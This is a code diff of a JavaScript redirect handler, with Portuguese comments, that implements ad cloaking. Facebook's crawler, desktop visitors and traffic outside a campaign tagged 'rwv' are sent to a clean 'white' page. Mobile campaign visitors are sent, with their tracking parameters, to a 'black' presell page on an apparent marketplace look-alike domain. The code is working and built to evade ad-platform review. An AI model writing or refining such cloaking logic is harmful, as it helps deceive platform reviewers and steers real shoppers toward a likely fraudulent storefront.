@@ -6,28 +6,27 @@ export default function handler(req) {
   const url = new URL(req.url);
   const userAgent = req.headers.get('user-agent') || '';
   
-  // Captura os parâmetros da URL de forma eficiente
+  // Captura a UTM e a Query String completa
   const utmCampaign = url.searchParams.get('utm_campaign') || '';
-  const queryString = url.search; // Mantém o ? e todos os parâmetros
+  const queryString = url.search; 
 
   const pageWhite = "https://cheerful-bloom-box.lovable.app/";
   const pageBlack = "https://casadasspanelas.shop/shopee/presell-ml/";
 
-  // Filtros de Segurança
+  // Filtros
   const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
   const isFacebook = /facebookexternalhit|Facebot|FBAN|FBAV/i.test(userAgent);
   
-  // Verificação da UTM (ajustei para 'rwv' conforme seu código novo)
+  // Sua regra: campaign precisa conter 'rwv'
   const hasVn = utmCampaign.includes('rwv');
 
   // Lógica de Redirecionamento
-  if (isFacebook || !isMobile || !hasVn) {
-    // Redireciona para White (sem parâmetros para limpar rastro)
-    return Response.redirect(pageWhite, 302);
+  if (!isFacebook && isMobile && hasVn) {
+    // Vai para a BLACK mantendo os parâmetros
+    const finalDestination = `${pageBlack}${queryString}`;
+    return Response.redirect(finalDestination, 302);
   }
 
-  // Redireciona para Black mantendo TODAS as UTMs originais
-  const finalDestination = `${pageBlack}${queryString}`;
-  
-  return Response.redirect(finalDestination, 302);
+  // Todo o resto vai para a WHITE
+  return Response.redirect(pageWhite, 302);
 }
